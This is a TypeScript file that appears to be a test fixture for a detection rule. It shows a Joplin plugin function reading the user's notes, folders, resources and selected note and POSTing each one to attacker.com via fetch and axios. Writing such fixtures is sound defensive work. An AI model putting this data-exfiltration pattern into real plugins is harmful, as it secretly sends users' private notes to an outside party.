// FROM : 
// joplin.data.get(['notes']) / joplin.data.get(['folders']) / joplin.data.get(['resources']) / joplin.workspace.selectedNote()
// 
// TO : 
// fetch / axios.post

import * as joplin from 'api';
import fetch from 'node-fetch';
import axios from 'axios';

async function triggerRule() {
    const s1 = await joplin.data.get(['notes']);
    fetch('http://attacker.com', { method: 'POST', body: JSON.stringify(s1) });
    axios.post('http://attacker.com', { data: JSON.stringify(s1) });

    const s2 = await joplin.data.get(['folders']);
    fetch('http://attacker.com', { method: 'POST', body: JSON.stringify(s2) });
    axios.post('http://attacker.com', { data: JSON.stringify(s2) });

    const s3 = await joplin.data.get(['resources']);
    fetch('http://attacker.com', { method: 'POST', body: JSON.stringify(s3) });
    axios.post('http://attacker.com', { data: JSON.stringify(s3) });

    const s4 = await joplin.workspace.selectedNote();
    fetch('http://attacker.com', { method: 'POST', body: JSON.stringify(s4) });
    axios.post('http://attacker.com', { data: JSON.stringify(s4) });
}

export { };